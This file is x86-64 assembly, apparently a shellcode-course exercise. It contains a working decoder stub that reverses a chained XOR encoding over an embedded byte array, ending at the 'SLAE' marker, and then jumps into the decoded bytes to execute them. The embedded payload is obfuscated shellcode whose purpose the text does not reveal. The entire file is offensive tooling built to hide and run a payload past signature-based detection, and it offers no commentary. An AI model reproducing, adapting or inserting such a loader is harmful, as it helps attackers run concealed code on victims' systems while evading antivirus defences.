        BITS 64
        global _start
        section .text

_start:
        EGG             equ 'SLAE'
        BASE_DECODER    equ 0xAA

start:
        lea     rdi, [rel SHELLCODE]    ; load &SHELLCODE on %rax
        push    rdi                     ; store &SHELLCODE on stack
        xor     rbx, rbx
        mov     bl, BASE_DECODER
        xor     rcx, rcx
        dec     rdi

next_addr:
        inc     rdi
        mov     cl, byte[rdi]
        xor     byte [rdi], bl
        mov     bl, cl
        cmp     dword [rdi+0x1], EGG
        jne     next_addr

run:
        pop     rax                     ; load saved &SHELLCODE
        jmp     rax                     ; run the SHELLCODE


SHELLCODE:      db 0xc0,0xe9,0xb1,0xdb,0xd9,0x86,0xec,0xed,0xb3,0x82,0x50,0x5f,0x5a,0x0a,0x55,0x07,0x55,0x93,0x97,0xb3,0xb1,0xd7,0x10,0x54,0x70,0x72,0x51,0x56,0xee,0x3b,0x91,0x3b,0x90,0xa5,0x0f,0xa5,0x0f,0xa5,0x2c,0x68,0x4c,0x48,0x1c,0x42,0x28,0x38,0x62,0x08,0x22,0x7a,0x75,0x70,0x41,0x81,0x8e,0x8b,0x0a,0x34,0x03,0x35,0x0c,0x34,0x41,0x64,0x0e,0x0d,0x53,0x1b,0xe4,0x2a,0x40,0x61,0x39,0x36,0x33,0x46,0xb0,0xf8,0xd1,0x03,0x51,0x03,0x5d,0x15,0xaa,0x85,0xaa,0xc8,0xa1,0xcf,0xe0,0x93,0xfb,0xac,0xf8,0xa7,0xcd,0xf6,0xae,0xa1,0xa4,'SLAE'